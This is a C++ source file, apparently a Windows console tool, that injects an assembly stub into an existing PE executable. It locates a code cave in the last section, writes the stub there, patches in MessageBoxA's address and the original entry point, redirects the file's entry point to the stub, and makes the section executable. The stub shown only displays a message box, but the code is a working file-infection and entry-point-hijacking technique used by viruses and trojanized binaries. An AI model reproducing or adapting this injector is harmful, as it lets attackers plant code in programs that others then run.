// ConsoleApplication1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdlib.h>
#include <Windows.h>
#include <conio.h>



#define bb(x) __asm _emit x

__declspec(naked) void StubStart()
{
	__asm{
		pushad  // preserve our thread context
			call GetBasePointer
		GetBasePointer :
		pop ebp
			sub ebp, offset GetBasePointer // delta offset trick. Think relative...

			push MB_OK
			lea  eax, [ebp + szTitle]
			push eax
			lea  eax, [ebp + szText]
			push eax
			push 0
			mov  eax, 0xCCCCCCCC
			call eax

			popad   // restore our thread context
			push 0xCCCCCCCC // push address of orignal entrypoint(place holder)
			retn    // retn used as jmp

		szText :
		bb('H') bb('e') bb('l') bb('l') bb('o') bb(' ') bb('W') bb('o') bb('r') bb('l') bb('d')
			bb(' ') bb('f') bb('r') bb('o') bb('m') bb(' ') bb('K') bb('O') bb('r') bb('U') bb('P') bb('t') bb(0)
		szTitle :
				bb('O') bb('h') bb('a') bb('i') bb(0)

	}
}
void StubEnd(){}

// By Napalm
DWORD FileToVA(DWORD dwFileAddr, PIMAGE_NT_HEADERS pNtHeaders)
{
	PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
	for (WORD wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++){
		if (dwFileAddr >= lpSecHdr->PointerToRawData){
			if (dwFileAddr < (lpSecHdr->PointerToRawData + lpSecHdr->SizeOfRawData)){
				dwFileAddr -= lpSecHdr->PointerToRawData;
				dwFileAddr += (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
				return dwFileAddr;
			}
		}

		lpSecHdr++;
	}

	return NULL;
}
int _tmain(int argc, _TCHAR* argv[])
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeaders;
	PIMAGE_SECTION_HEADER pSection, pSectionHeader;
	HANDLE hFile, hFileMap;
	//LPCWSTR szFileName = L"C:\\Users\\trieu\\Desktop\\crack.exe";
	//HMODULE hUser32;
	LPBYTE hMap;

	int i = 0, charcounter = 0;
	DWORD oepRva = 0, oep = 0, fsize = 0, writeOffset = 0, oepOffset = 0, callOffset = 0;
	unsigned char *stub;

	// work out stub size
	DWORD start = (DWORD)StubStart;
	DWORD end = (DWORD)StubEnd;
	DWORD stubLength = (end - start);
	
	if (argc != 2){
		printf("Usage: %s [file]\n", argv[0]);
		//return 0;
	}

	// map file
	hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		printf("[-] Cannot open %s\n", argv[1]);
		return 0;
	}

	fsize = GetFileSize(hFile, 0);
	if (!fsize){
		printf("[-] Could not get files size\n");
		CloseHandle(hFile);
		return 0;
	}

	hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, fsize, NULL);
	if (!hFileMap){
		printf("[-] CreateFileMapping failed\n");
		CloseHandle(hFile);
		return 0;
	}

	hMap = (LPBYTE)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fsize);
	if (!hMap){
		printf("[-] MapViewOfFile failed\n");
		CloseHandle(hFileMap);
		CloseHandle(hFile);
		return 0;
	}

	// check signatures
	pDosHeader = (PIMAGE_DOS_HEADER)hMap;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
		printf("[-] DOS signature not found\n");
		goto cleanup;
	}

	pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hMap + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE){
		printf("[-] NT signature not found\n");
		goto cleanup;
	}

	// get last section's header...
	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)hMap + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	pSection = pSectionHeader;
	pSection += (pNtHeaders->FileHeader.NumberOfSections - 1);

	// save entrypoint
	oep = oepRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	oep += (pSectionHeader->PointerToRawData) - (pSectionHeader->VirtualAddress);

	// locate free space
	i = pSection->PointerToRawData;
	for (; i != fsize; i++){
		if ((char *)hMap[i] == 0x00){
			if (charcounter++ == stubLength + 24){
				printf("[+] Code cave located @ 0x%08lX\n", i);
				writeOffset = i;
			}
		}
		else charcounter = 0;
	}

	if (charcounter == 0 || writeOffset == 0){
		printf("[-] Could not locate a big enough code cave\n");
		goto cleanup;
	}

	writeOffset -= stubLength;

	stub = (unsigned char *)malloc(stubLength + 1);
	if (!stub){
		printf("[-] Error allocating sufficent memory for code\n");
		goto cleanup;
	}

	// copy stub into a buffer
	memcpy(stub, StubStart, stubLength);

	// locate offsets of place holders in code
	for (i = 0, charcounter = 0; i != stubLength; i++){
		if (stub[i] == 0xCC){
			charcounter++;
			if (charcounter == 4 && callOffset == 0)
				callOffset = i - 3;
			else if (charcounter == 4 && oepOffset == 0)
				oepOffset = i - 3;
		}
		else charcounter = 0;
	}

	// check they're valid
	if (oepOffset == 0 || callOffset == 0){
		free(stub);
		goto cleanup;
	}

	HMODULE hUser32 = LoadLibrary(TEXT("User32.dll"));
	if (!hUser32){
		free(stub);
		printf("[-] Could not load User32.dll");
		goto cleanup;
	}

	// fill in place holders
	*(u_long *)(stub + oepOffset) = (oepRva + pNtHeaders->OptionalHeader.ImageBase);
	*(u_long *)(stub + callOffset) = ((DWORD)GetProcAddress(hUser32, "MessageBoxA"));
	FreeLibrary(hUser32);

	// write stub
	memcpy((PBYTE)hMap + writeOffset, stub, stubLength);

	// set entrypoint
	pNtHeaders->OptionalHeader.AddressOfEntryPoint =
		FileToVA(writeOffset, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase;

	// set section size
	pSection->Misc.VirtualSize += stubLength;
	pSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

	// cleanup
	printf("[+] Stub written!!\n[*] Cleaning up\n");
	free(stub);

cleanup:
	FlushViewOfFile(hMap, 0);
	UnmapViewOfFile(hMap);

	SetFilePointer(hFile, fsize, NULL, FILE_BEGIN);
	SetEndOfFile(hFile);
	CloseHandle(hFileMap);
	CloseHandle(hFile);
	return 0;
}
